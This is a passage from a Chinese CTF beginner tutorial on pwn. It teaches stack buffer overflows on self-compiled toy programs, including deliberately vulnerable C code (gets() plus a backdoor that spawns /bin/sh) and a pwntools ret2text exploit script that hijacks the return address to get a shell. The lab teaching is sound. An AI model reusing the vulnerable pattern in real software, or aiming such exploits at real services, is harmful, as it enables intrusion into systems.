+<h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h4><p><strong>1. 用 checksec 检查保护机制</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file=pwn</span><br></pre></td></tr></table></figure>
+
+<p>我们将得到该程序的保护机制：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x400000)</span><br><span class="line">SHSTK:      Enabled</span><br><span class="line">IBT:        Enabled</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>能看到栈缓冲区溢出保护（Stack Canary）和位置无关程序（PIE）保护已关闭。</p>
+<p><strong>2. 用 IDA 反汇编反编译挖掘漏洞</strong></p>
+<p>将程序拖到 IDA 中，首次打开该程序会显示如下设置：</p>
+<p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20260821153129135.png" alt="image-20260821153129135"></p>
+<p>接下来我们将进入 IDA 的主界面：</p>
+<p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20260821153148033.png" alt="image-20260821153148033"></p>
+<p>通过按快捷键 F5 或者 TAB 进行反编译，进入到伪代码界面：</p>
+<p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20260821153206276.png" alt="image-20260821153206276"></p>
+<p>我们能看到，IDA 对该程序进行了反编译，形成了一个类 C 的伪代码，与前面我们编写的题目进行对比，能看到首先丢失了符号信息，<code>main</code> 函数中的 <code>flag</code> 和 <code>buf</code> 两个符号都已经没了，与之对应的分别对是这里的 <code>s1[8]</code> 与 <code>v4</code>，甚至类型信息也存在问题，我们源程序中的 <code>buf</code> 是一个 <code>char</code> 类型的数组，这里被识别为了 <code>__int64</code>，而且 <code>gets</code> 函数明明只有一个参数，这里变成了两个参数。鼠标点击符号使光标移动于此，通过快捷键 <code>n</code> 更改变量名称，快捷键 <code>y</code> 更改类型，还原一下程序原本的样貌，此时可以看到，程序已经和我们最初的源码几近相同了。真实情境下我们大概没有源码，需要自行推断栈上变量布局。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"><span class="type">char</span> flag[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br></pre></td></tr></table></figure>
+
+<p>此时我们阅读一下程序的逻辑，它通过 <code>gets</code> 向 buf 中进行了读取，之后进行了一个判别，如果 <code>flag</code> 的内容为 <code>YourFlag</code>，则会执行 <code>getflag</code> 函数获得 flag，可是我们自始至终没有对 flag 进行输入，这要怎么控制它的内容呢？原来，<code>gets</code> 对输入长度没有进行限制，它会一直读取到换行符 <code>\n</code> 才停止（直接运行的话，一直到我们输入回车停止），但它的长度只有 8，多输入的部分会到哪呢？接下来，我们通过 GDB 进行动态调试，观察一下溢出的部分到了哪里。</p>
+<p><strong>3. GDB 调试</strong></p>
+<p>通过 <code>gdb ./pwn</code> 调试该程序：</p>
+<p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20260821153310549.png" alt="image-20260821153310549"></p>
+<p>接下来我们将进入到 GDB 的页面，通过 <code>start</code> 启动程序：</p>
+<p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20260821153323373.png" alt="image-20260821153323373"></p>
+<p>能看到右侧最上面 pwndbg 输出了相关的寄存器，中间是我们程序执行到的位置，以汇编形式展示，下面是栈中的内容，最下面是程序的调用栈，通过 <code>ni</code> 命令，我们能逐指令执行，在 IDA 中我们观察到，<code>buf</code> 和 <code>flag</code> 相对于 <code>rbp</code> 的位置是：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"><span class="type">char</span> flag[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br></pre></td></tr></table></figure>
+
+<p>当执行到 <code>gets</code> 函数的时候，我们通过 <code>tele</code> 指令查看一下 <code>rbp-0x10</code> 处的内容：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele rbp-0x10</span><br><span class="line">00:0000│ rdi rsp 0x7fff6433f640 ◂— 0x1000</span><br><span class="line">01:0008│-008     0x7fff6433f648 —▸ 0x401110 (_start) ◂— endbr64</span><br><span class="line">02:0010│ rbp     0x7fff6433f650 ◂— 1</span><br><span class="line">03:0018│+008     0x7fff6433f658 —▸ 0x7c6f6ce29d90 (__libc_start_call_main+128) ◂— mov edi, eax</span><br><span class="line">04:0020│+010     0x7fff6433f660 ◂— 0</span><br><span class="line">05:0028│+018     0x7fff6433f668 —▸ 0x40125b (main) ◂— endbr64</span><br><span class="line">06:0030│+020     0x7fff6433f670 ◂— 0x16433f750</span><br></pre></td></tr></table></figure>
+
+<p>能看到，此时 <code>rbp-0x10</code> 处的 buf 的内容是 0x1000，而 <code>rbp-8</code> 处的 flag 的内容是 0x401110。接下来我们再次 <code>ni</code>，执行 <code>gets</code> 函数，并输入 16 个 a，观察溢出的 8 个 a 的去向：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele rbp-0x10</span><br><span class="line">00:0000│ rax rsp 0x7fff6433f640 ◂— &#x27;aaaaaaaaaaaaaaaa&#x27;</span><br><span class="line">01:0008│-008     0x7fff6433f648 ◂— &#x27;aaaaaaaa&#x27;</span><br><span class="line">02:0010│ rbp     0x7fff6433f650 ◂— 0</span><br><span class="line">03:0018│+008     0x7fff6433f658 —▸ 0x7c6f6ce29d90 (__libc_start_call_main+128) ◂— mov edi, eax</span><br><span class="line">04:0020│+010     0x7fff6433f660 ◂— 0</span><br><span class="line">05:0028│+018     0x7fff6433f668 —▸ 0x40125b (main) ◂— endbr64</span><br><span class="line">06:0030│+020     0x7fff6433f670 ◂— 0x16433f750</span><br></pre></td></tr></table></figure>
+
+<p>此时发现，不仅 <code>rbp-0x10</code> 处被 a 覆盖掉了，<code>rbp-8</code> 处的 flag 也被多余出来的 8 个 a 覆盖掉了，这便是发生了溢出，并且是从低地址 0x7fff6433f640 向高地址 0x7fff6433f648，如若我们将后 8 个 a 更改为 <code>YourFlag</code>，便能将 flag 的内容填充为 <code>YourFlag</code>，程序最终成功执行 <code>getflag</code> 函数。</p>
+<p>我们通过 <code>run</code> 命令，重新执行该程序，再试一次：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; run</span><br><span class="line">Starting program: /mnt/d/pwn/ctf/dasctf/mini/pwn</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">Now input something! Maybe I can give you a flag!</span><br><span class="line">aaaaaaaaYourFlag</span><br><span class="line">flag&#123;Congratulations You get your first flag!&#125;</span><br><span class="line">I know u can do this!</span><br></pre></td></tr></table></figure>
+
+<p>此时便成功获得了 flag。</p>
+<h3 id="一个简单的-ret2text"><a href="#一个简单的-ret2text" class="headerlink" title="一个简单的 ret2text"></a>一个简单的 ret2text</h3><p>接下来是一个简单的 <code>ret2text</code> 实例。在该实例中，将进一步了解栈缓冲区溢出的威力，以及 pwntools 的用法。</p>
+<p>环境：x86_64 GNU&#x2F;Linux</p>
+<p>通过以下命令进行编译（<code>$</code> 仅为提示符，实际不输入），强制启用 <code>char *gets(char *)</code> 并关闭一些保护机制：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// File: pwn.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  gets(name);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s!\n&quot;</span>, name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc --ansi -no-pie -fno-stack-protector pwn.c -o pwn</span><br><span class="line">$ checksec --file=pwn</span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们假设这个程序文件在网上公开下载，假设这个程序在一台服务器上运行，已经暴露在网络中，提供给远程计算机进行交互。现在我们来攻击它。 😈</p>
+<h4 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h4><p><strong>1. 用 checksec 检查保护机制</strong></p>
+<p>我们是攻击者，已经得到了这个程序文件（就是刚才编译的结果）。在程序所在目录执行，输出（部分略）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE</span><br></pre></td></tr></table></figure>
+
+<p>可以看到栈缓冲区溢出保护（Stack Canary）和位置无关程序（PIE）保护已关闭。</p>
+<p><strong>2. 用 IDA 反汇编反编译挖掘漏洞</strong></p>
+<p>将程序拖入 IDA 中加载（你可能需要将程序文件从虚拟机中移到主机中，这里不赘述），找到 <code>main</code> 函数，按 F5 反编译显然可得该程序使用一个不会检查输入与缓冲区长度的 <code>gets</code> 函数读入字符串，我们因此可以进行无限长栈缓冲区溢出。同时我们看到 <code>backdoor</code> 函数会启用一个 shell，这正是我们想要的。由于没有启用 PIE，于是只需将控制流劫持到此处（静态地址）即可。记下 <code>backdoor</code> 函数地址。</p>
+<p>主函数结束方式为正常 return，此时程序执行流会跳转到先前调用主函数时保存在栈中的返回地址所指向的位置。但是由于栈向低地址扩展（反向），而字符串写入由低地址向高地址（正向），且程序执行时先保存返回地址再开辟用于存储栈上字符串的空间，所以返回地址位于读入字符串的高地址处且可因字符串溢出而被修改。<code>gets(char *)</code> 在读入字符串时不会检查长度，可以任意长度溢出。因此只需覆盖返回地址至 <code>backdoor</code> 即可。别忘了调用栈上返回地址前还保存了栈指针，虽然对解题无影响，但因此需要多输入覆盖 8 个字节。由于编译器会倾向将栈上变量地址 16 字节对齐（地址能被 16 整除），所以栈上最高地址（最后一个）变量的末尾可能不紧贴暂存的 rbp。不能通过变量的”大小”直接判定其与栈底的偏移，做题时可以通过反编译结果中变量旁的注释查看栈上变量的准确位置。</p>
+<p><strong>3. 用 GDB + pwndbg 调试</strong></p>
+<p>在程序所在目录执行（<code>pwndbg&gt;</code> 仅为提示符，实际不输入）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./pwn</span><br><span class="line">pwndbg&gt; b gets</span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure>
+
+<p>触发断点。观察 <code>[ STACK ]</code> 一栏，可以看到当前的程序调用栈（注意 GDB 中地址空间随机化默认不启用，但对于本题无影响）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp     0x7fffffffd4a8 —▸ 0x40118f (main+35) ◂— lea rax, [rbp - 10h]</span><br><span class="line">01:0008│ rax rdi 0x7fffffffd4b0 ◂— 0x0</span><br><span class="line">02:0010│-008     0x7fffffffd4b8 —▸ 0x7fffffffd5e8 —▸ 0x7fffffffda83</span><br><span class="line">03:0018│ rbp     0x7fffffffd4c0 —▸ 0x7fffffffd560 —▸ 0x7fffffffd5c0 ◂— 0x0</span><br><span class="line">04:0020│+008     0x7fffffffd4c8 —▸ 0x7ffff7da7e08 (__libc_start_call_main+120) ◂— mov edi, eax</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>（其中 <code>—▸</code> 和 <code>◂—</code> 都可理解为 C 语言中的指针解引用，<code>0x7fxxxx</code> 为栈地址，未实际存储。）</p>
+<ul>
+<li><code>rsp + 0x00</code>：当前栈顶。存放 <code>gets</code> 函数的返回地址。（不重要，无法控制）</li>
+<li><code>rsp + 0x08</code>：存放 name 前半。第 1 个参数（<code>rdi</code> 所指），即源码中 name。用户输入自此读入。</li>
+<li><code>rsp + 0x10</code>：存放 name 后半。此时仍有”垃圾”数据。</li>
+<li><code>rsp + 0x18</code>：存放 <code>__libc_start_call_main</code> 函数（<code>main</code> 的调用方）的调用栈帧基址（<code>rbp</code>）。</li>
+<li><code>rsp + 0x20</code>：存放 <code>main</code> 函数返回地址。</li>
+</ul>
+<p><strong>4. 用 Python + pwntools 编写利用脚本</strong></p>
+<p>在程序所在目录编写 Python 脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: pwnit.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                 <span class="comment"># pwntools</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)             <span class="comment"># 启动程序</span></span><br><span class="line">backdoor_address = ...            <span class="comment"># 刚才获得的 `backdoor` 地址</span></span><br><span class="line">backdoor_address += <span class="number">1</span>             <span class="comment"># 施法</span></span><br><span class="line">payload  = cyclic(<span class="number">0x10</span>)           <span class="comment"># 填满 `name`</span></span><br><span class="line">payload += cyclic(<span class="number">0x8</span>)            <span class="comment"># 填满暂存的 `rbp`</span></span><br><span class="line">payload += p64(backdoor_address)  <span class="comment"># 篡改返回地址</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;?\n&#x27;</span>, payload) <span class="comment"># 待输出至 `?\n` 后输入 payload</span></span><br><span class="line">io.interactive()                  <span class="comment"># 收获成果</span></span><br></pre></td></tr></table></figure>
+
+<p>在程序所在目录执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python pwnit.py</span><br></pre></td></tr></table></figure>
+
+<p>成功 getshell。 🎉</p>
+<p>实际上你需要用 <code>io = connect(&#39;&lt;IP&gt;&#39;, &lt;端口&gt;)</code> 替换 <code>io = process(&#39;./pwn&#39;)</code> 以攻击远程环境（相当于 nc 连接）。</p>
+<blockquote>
+<p><strong>NOTE</strong></p>
+<p><code>backdoor_address += 1</code> 是个啥？</p>
+<p>你可以试着去掉这行再运行看看，程序运行时触发 SIGSEGV（段错误）。这是 Pwn 初学者必踩一次的坑。用 GDB 调试运行（pwntools <code>gdb</code> 模块能帮到你），程序在 system 函数中这个指令处崩溃：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movaps xmmword ptr [rsp + 0x50], xmm0</span><br></pre></td></tr></table></figure>
+
+<p>其实是 <code>movaps</code> 指令要求目标地址（此处为 <code>rsp + 0x50</code>）16 字节对齐（尾数为 0）导致的。通过将劫持的地址 +1，跳过 <code>backdoor</code> 中的 <code>push rbp</code>（该指令机器码长度 1 字节）从而使 <code>rsp</code> 16 字节对齐。</p>
+<p>类似的解决方案是在 ROP 调用链中插入一个空 gadget（仅 <code>ret</code>），使 <code>rsp</code> 16 字节对齐。</p>
+</blockquote>
+<h2 id="十三、总结"><a href="#十三、总结" class="headerlink" title="十三、总结"></a>十三、总结</h2><p>感谢你认真读到这里，Pwn 真的是一个很难入门的方向，冗长的前置知识，漫长的打基础，往往会劝退很多同学，但请相信，你的努力不会白费，历尽千帆，你终将成为大佬！为了防止我们的新同学们被劝退，我们在指北中添加了很多文章、课程、以及常见入门会遇到的坑，希望你能够通过指北，顺利入门 pwn，成为 CTF 题解领域的高手！🎉</p>
+<h2 id="十四、补充：关于-AI-解题"><a href="#十四、补充：关于-AI-解题" class="headerlink" title="十四、补充：关于 AI 解题"></a>十四、补充：关于 AI 解题</h2><p><strong>背景</strong> AI 工具在 CTF 中的应用越来越普遍，尤其是在比赛期间，AI 工具可以大大提升我们的解题效率。</p>
+<p><strong>看法</strong> AI 在 CTF 和 pwn 中的应用确实可以大大提升我们的解题效率，但是我们也应该看到 AI 的局限性。AI 可以帮助我们快速搜索题目名称、提示中的专业名词、以及一些常见的漏洞类型和攻击手法，从而帮助我们更快地找到解题思路和方法。但是 AI 可以帮助我们进行一些简单的自动化测试，例如自动测试代码的漏洞、自动测试网络的漏洞等，从而帮助我们更快地找到漏洞和漏洞。</p>
+<p><strong>建议</strong> 那么在这里也给出一些对于 AI 使用的建议。我们建议把 AI 作为较为方便的搜索引擎、个人特殊情况解决的引导者，而不是你的万能解题工具。在遇到一些看不懂的概念（如题目名称或提示中的专业名词），可以拿 AI 搜索，来帮助初步了解概念的含义&#x2F;这种操作大概是在做什么、什么情况下要这么做和为什么这么做，但是具体深入学习还是建议去看 CTF wiki、pwn college 或技术博客这类型专业人士写的经验之谈。同时有时候个人遇到一些非普遍问题，在网上找不到解决方法时（这时应该先找群管理问一问）、群管理也没招时可以问问 AI 解决办法，能够根据用户进行一定个性化也算是 AI 的一个优点吧，没准它能帮你点对点地解决问题。但是真的真的非常不建议使用 agent 解题！！！</p>
+
+    </div>
+</article>
+
+
+<script src="https://giscus.app/client.js"
+        data-repo="Augenstern-W/Augenstern-W.github.io"
+        data-repo-id="R_kgDOUDwn2g"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOUDwn2s4DEWm7"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+</script>
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            忘江湖
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"><p>仗剑观书，落笔留痕，记录行路所见所闻，分享所思所想。</p>
+</p>
+        </div>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BPwn/">CTF初识之Pwn</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BWeb/">CTF初识之Web</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BReverse/">CTF初识之Reverse</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BSandBox/">CTF初识之SandBox</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BCrypto/">CTF初识之Crypto</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2026/08/27/CTF%E5%88%9D%E8%AF%86%E4%B9%8Bmisc/">CTF初识之misc</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="sidebar-rand_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            随机文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BCrypto/">CTF初识之Crypto</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BPwn/">CTF初识之Pwn</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BReverse/">CTF初识之Reverse</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BSandBox/">CTF初识之SandBox</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BWeb/">CTF初识之Web</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2026/08/27/CTF%E5%88%9D%E8%AF%86%E4%B9%8Bmisc/">CTF初识之misc</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+
+                
+                <li>
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BPwn/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BPwn/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2026/08/28/CTF%E5%88%9D%E8%AF%86%E4%B9%8BPwn/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+                
+            </ul>
+            <div class="tab-content">
+                
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+    <a href="/tags/CTF/" style="font-size: 13.54857368219655px;" class="tag-cloud-link">CTF</a>
+    
+    <a href="/tags/Crypto/" style="font-size: 10.583707835415744px;" class="tag-cloud-link">Crypto</a>
+    
+    <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 13.932932256636757px;" class="tag-cloud-link">密码学</a>
+    
+    <a href="/tags/Python/" style="font-size: 15.476746801611654px;" class="tag-cloud-link">Python</a>
+    
+    <a href="/tags/Markdown/" style="font-size: 8.74664678605188px;" class="tag-cloud-link">Markdown</a>
+    
+    <a href="/tags/markdown-all-in-one-VS-Code-%E7%9A%84%E6%8F%92%E4%BB%B6/" style="font-size: 16.632556186646248px;" class="tag-cloud-link">markdown all in one(VS Code 的插件)</a>
+    
+    <a href="/tags/Typora/" style="font-size: 16.09478107536385px;" class="tag-cloud-link">Typora</a>
+    
+    <a href="/tags/Obisidian/" style="font-size: 18.474106020779992px;" class="tag-cloud-link">Obisidian</a>
+    
+    <a href="/tags/Sagemath/" style="font-size: 8.929950297318502px;" class="tag-cloud-link">Sagemath</a>
+    
+    <a href="/tags/LLM/" style="font-size: 16.38286375129985px;" class="tag-cloud-link">LLM</a>
+    
+    <a href="/tags/agent/" style="font-size: 16.827526256349586px;" class="tag-cloud-link">agent</a>
+    
+    <a href="/tags/%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/" style="font-size: 9.556820182286739px;" class="tag-cloud-link">初等数论</a>
+    
+    <a href="/tags/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/" style="font-size: 15.942005448261515px;" class="tag-cloud-link">线性代数</a>
+    
+    <a href="/tags/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80/" style="font-size: 10.092932192561602px;" class="tag-cloud-link">算法基础</a>
+    
+    <a href="/tags/pycryptodome/" style="font-size: 11.82884811830687px;" class="tag-cloud-link">pycryptodome</a>
+    
+    <a href="/tags/pwntools/" style="font-size: 10.354155982966823px;" class="tag-cloud-link">pwntools</a>
+    
+    <a href="/tags/md5%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%E7%A0%B4%E8%A7%A3/" style="font-size: 10.51939869389557px;" class="tag-cloud-link">md5在线解密破解</a>
+    
+    <a href="/tags/%E5%BD%A9%E8%99%B9%E8%A1%A8/" style="font-size: 12.157086904117243px;" class="tag-cloud-link">彩虹表</a>
+    
+    <a href="/tags/Pwn/" style="font-size: 19.197422288021887px;" class="tag-cloud-link">Pwn</a>
+    
+    <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" style="font-size: 14.494605403914493px;" class="tag-cloud-link">二进制安全</a>
+    
+    <a href="/tags/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/" style="font-size: 13.626463572017483px;" class="tag-cloud-link">程序设计</a>
+    
+    <a href="/tags/IDA/" style="font-size: 9.239373555277563px;" class="tag-cloud-link">IDA</a>
+    
+    <a href="/tags/GDB/" style="font-size: 12.150267453832893px;" class="tag-cloud-link">GDB</a>
+    
+    <a href="/tags/Linux/" style="font-size: 9.753910643480879px;" class="tag-cloud-link">Linux</a>
+    
+    <a href="/tags/%E7%BC%96%E8%AF%91%E4%B8%8E%E6%B1%87%E7%BC%96/" style="font-size: 11.335798592072269px;" class="tag-cloud-link">编译与汇编</a>
+    
+    <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 12.637901310043976px;" class="tag-cloud-link">操作系统</a>
+    
+    <a href="/tags/AI/" style="font-size: 16.989985850092157px;" class="tag-cloud-link">AI</a>
+    
+    <a href="/tags/GLibc/" style="font-size: 9.702164136282516px;" class="tag-cloud-link">GLibc</a>
+    
+    <a href="/tags/pwn-collge/" style="font-size: 17.404632079722745px;" class="tag-cloud-link">pwn collge</a>
+    
+    <a href="/tags/Reverse/" style="font-size: 8.529013021223376px;" class="tag-cloud-link">Reverse</a>
+    
+    <a href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/" style="font-size: 12.533095480148583px;" class="tag-cloud-link">逆向工程</a>
+    
+    <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/" style="font-size: 12.75168330750385px;" class="tag-cloud-link">反编译工具</a>
+    
